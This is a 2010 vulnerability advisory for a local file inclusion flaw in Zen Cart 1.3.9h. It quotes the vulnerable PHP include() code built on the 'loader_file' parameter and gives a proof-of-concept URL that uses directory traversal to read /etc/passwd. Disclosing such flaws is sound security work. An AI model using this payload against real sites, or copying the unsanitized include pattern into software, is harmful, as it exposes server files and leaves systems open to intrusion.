@@ -1,0 +1,83 @@
+Zen Cart 1.3.9h Local File Inclusion Vulnerability
+
+ Name              Zen Cart
+ Vendor            http://www.zen-cart.com
+ Versions Affected 1.3.9h
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-11-03
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+Zen Cart   truly   is   the  art  of   e-commerce;  free,
+user-friendly,  open  source  shopping cart software. The
+ecommerce web site design program is being developed by a
+group of like-minded shop owners, programmers, designers,
+and consultants that think ecommerce web design could  be
+and should be done differently.
+
+
+II. DESCRIPTION
+_______________
+
+A parameter is not properly sanitised before being  used
+by the include() PHP's function.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Local File Inclusion
+ 
+
+A) Local File Inclusion
+_______________________
+
+Input   passed   to   the   "loader_file"   parameter  in
+includes/initsystem.php  is  not properly verified before
+being  used  to  include  files. This can be exploited to
+include  arbitrary  files   from   local   resources  via
+directory traversal attacks.
+
+Successful exploitation requires that register_globals is
+set to On.
+
+The following is the vulnerable code:
+
+<?php
+
+$base_dir = DIR_WS_INCLUDES . 'auto_loaders/';
+if (file_exists(DIR_WS_INCLUDES . 'auto_loaders/overrides/' . $loader_file)) {
+  $base_dir = DIR_WS_INCLUDES . 'auto_loaders/overrides/';
+}
+
+include($base_dir . $loader_file);
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Local File Inclusion
+
+http://site/path/includes/initsystem.php?loader_file=../../../../../../../../etc/passwd
+
+
+V. FIX
+______
+
+No fix.
+
